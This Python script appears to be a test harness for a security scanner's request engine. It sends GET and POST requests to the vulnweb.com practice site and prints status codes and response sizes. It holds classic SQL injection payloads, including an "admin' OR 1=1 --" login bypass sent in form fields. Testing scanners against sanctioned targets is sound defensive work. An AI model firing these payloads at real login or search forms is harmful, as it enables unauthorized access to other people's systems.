import json
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import httpx
from core.request_engine import RequestEngine


def main():
    cases = [
        {"name": "root_get", "method": "GET", "url": "http://testasp.vulnweb.com", "kwargs": {}},
        {"name": "search_named_query", "method": "GET", "url": "http://testasp.vulnweb.com/Search.asp", "kwargs": {"query_params": {"tfSearch": "' OR 1=1 --"}}},
        {"name": "login_named_form", "method": "POST", "url": "http://testasp.vulnweb.com/Login.asp?RetURL=%2FSearch%2Easp%3F", "kwargs": {"form_data": {"tfUName": "admin' OR 1=1 --", "tfUPass": ""}}},
    ]
    engine = RequestEngine(timeout=12, headers={"User-Agent": "Mozilla/5.0", "Accept": "*/*"})
    results = []
    for case in cases:
        try:
            result = engine.send_request(case["method"], case["url"], payload="probe", **case["kwargs"])
            results.append({"name": case["name"], "status": result["status_code"], "size": result["response_size"], "error": result["error"], "url": result["url"]})
        except Exception as exc:
            results.append({"name": case["name"], "exception": str(exc)})
    with httpx.Client(timeout=12, follow_redirects=True, headers={"User-Agent": "Mozilla/5.0", "Accept": "*/*"}) as client:
        for case in cases:
            try:
                if case["method"] == "GET":
                    response = client.get(case["url"], params=case["kwargs"].get("query_params"))
                else:
                    response = client.post(case["url"], data=case["kwargs"].get("form_data"))
                results.append({"name": "direct_" + case["name"], "status": response.status_code, "size": len(response.content), "error": None, "url": str(response.url)})
            except Exception as exc:
                results.append({"name": "direct_" + case["name"], "exception": str(exc)})
    print(json.dumps(results, indent=2))


if __name__ == "__main__":
    main()
